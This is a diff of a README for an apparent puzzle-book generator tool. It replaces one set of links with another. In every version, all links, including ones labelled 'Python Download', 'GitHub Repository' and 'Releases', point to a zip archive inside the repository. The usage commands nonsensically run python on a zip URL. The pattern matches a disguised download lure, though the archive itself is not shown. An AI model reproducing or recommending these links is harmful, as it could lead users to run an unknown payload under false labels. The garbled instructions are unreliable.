@@ -1,6 +1,6 @@
 # 🧩 Puzzle-Book-Generator - Create Fun Puzzle Books Easily
 
-[![Download Puzzle-Book-Generator](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip)](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip)
+[![Download Puzzle-Book-Generator](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip)](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip)
 
 ## 📖 Description
 Puzzle-Book-Generator is a Python library and command-line tool designed for everyone. It allows you to create professional puzzle books that include Sudoku and Maze puzzles. You can customize difficulty levels, design professional layouts, and generate high-quality printed PDFs. This tool is perfect for anyone interested in creating fun and engaging puzzle books for personal use or for publishing.
@@ -11,11 +11,11 @@ Follow these simple steps to get started with Puzzle-Book-Generator:
 1. **Check System Requirements**
    - Windows, macOS, or Linux operating system.
    - Minimum of 4GB RAM.
-   - Python 3.7 or higher installed on your machine. You can download Python from [https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip).
+   - Python 3.7 or higher installed on your machine. You can download Python from [https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip).
    - A PDF reader to view your generated puzzle books.
 
 2. **Download & Install**
-   - Visit this page to download: [Puzzle-Book-Generator Releases](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip). 
+   - Visit this page to download: [Puzzle-Book-Generator Releases](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip). 
    - Choose the latest version from the list.
    - For Windows, download the `.exe` file. For macOS and Linux, download the appropriate package or script.
 
@@ -24,7 +24,7 @@ Follow these simple steps to get started with Puzzle-Book-Generator:
    - Navigate to the directory where you downloaded the Puzzle-Book-Generator.
    - Run the tool by entering the command:
      ```
-     python https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip
+     python https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip
      ```
    - Follow the prompts to customize your puzzle book.
 
@@ -51,12 +51,12 @@ Here are some example commands to help you get started:
 
 - To generate an Easy Sudoku book with 10 puzzles:
   ```
-  python https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip --type sudoku --difficulty easy --count 10 --output https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip
+  python https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip --type sudoku --difficulty easy --count 10 --output https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip
   ```
 
 - To generate a Medium Maze book with 5 puzzles:
   ```
-  python https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip --type maze --difficulty medium --count 5 --output https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip
+  python https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip --type maze --difficulty medium --count 5 --output https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip
   ```
 
 ## 🌐 Contributing
@@ -88,9 +88,9 @@ To ensure everything works correctly, you can run the tests provided in the repo
 If you encounter any problems or have questions, please check the Issues tab on GitHub. You can also leave a message in Discussions, and we will strive to help you as soon as possible.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip)
-- [Python Download](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip)
-- [Puzzle-Book-Generator Releases](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip)
+- [GitHub Repository](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip)
+- [Python Download](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip)
+- [Puzzle-Book-Generator Releases](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip)
 
 ## 👥 Topics
 - amazon-kdp
@@ -111,4 +111,4 @@ If you encounter any problems or have questions, please check the Issues tab on 
 - self-publishing
 - sudoku
 
-[![Download Puzzle-Book-Generator](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip)](https://raw.githubusercontent.com/JYMOH001/Puzzle-Book-Generator/main/rendible/Puzzle-Book-Generator.zip)
+[![Download Puzzle-Book-Generator](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip)](https://github.com/JYMOH001/Puzzle-Book-Generator/raw/refs/heads/main/examples/Generator-Puzzle-Book-2.4.zip)
